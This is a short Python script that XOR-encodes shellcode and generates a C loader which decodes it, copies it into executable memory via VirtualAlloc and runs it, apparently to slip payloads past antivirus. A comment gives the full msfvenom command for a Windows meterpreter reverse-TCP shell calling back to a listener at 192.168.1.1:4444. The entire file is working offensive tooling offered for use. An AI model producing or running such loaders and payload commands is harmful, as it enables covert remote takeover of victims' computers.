#!/usr/bin/python
import binascii
import sys
#msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4444 -e x86/shikata_ga_nai -a x86 --platform windows -f hex > shell_code

def format_output(bytes, xor_key):
    ret = """#include <windows.h>
#include <iostream>
int main(int argc, char **argv) {"""
    ret += bytes
    ret += """ 
 char c[sizeof b];
 for (int i = 0; i < sizeof b; i++) {c[i] = b[i] ^ """
    ret += " %s " % hex(xor_key)
    ret += ";}"
    ret += """ 
 void *exec = VirtualAlloc(0, sizeof c, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
 memcpy(exec, c, sizeof c);
 ((void(*)())exec)();
}
"""
    return ret

def open_file(fname):
    o = open(fname, "r")
    ret = o.read()
    o.close()
    return ret

def write_file(fname, data):
    o = open(fname, "w")
    o.write(data)
    o.close()

def xor_code(scode, xor_key):
    ret = []
    for i in range(len(scode)):
        ret.append(ord(scode[i]) ^ xor_key)
    return ret

def to_byte_array(out_scode):
    byte_string = "char b[] = {"
    for i in range(len(out_scode)):
        byte_string += hex(out_scode[i])
        if i < len(out_scode)-1 : byte_string += ","
    byte_string += "};"
    return byte_string

def omg_halps():
    print("XOR your shellcode! xor_key = number 1-255")
    print("%s shellcode.txt compile_me.c <xor_key>" % sys.argv[0])

if __name__ == '__main__':
    if len(sys.argv) < 4:
        omg_halps()
        sys.exit(0)
    
    xor_key = int(sys.argv[3])
    hexbytes = open_file(sys.argv[1])
    xord_bytes = xor_code(binascii.unhexlify(hexbytes), xor_key)
    bytes = to_byte_array(xord_bytes)
    output_string = format_output(bytes, xor_key)
    write_file(sys.argv[2], output_string)
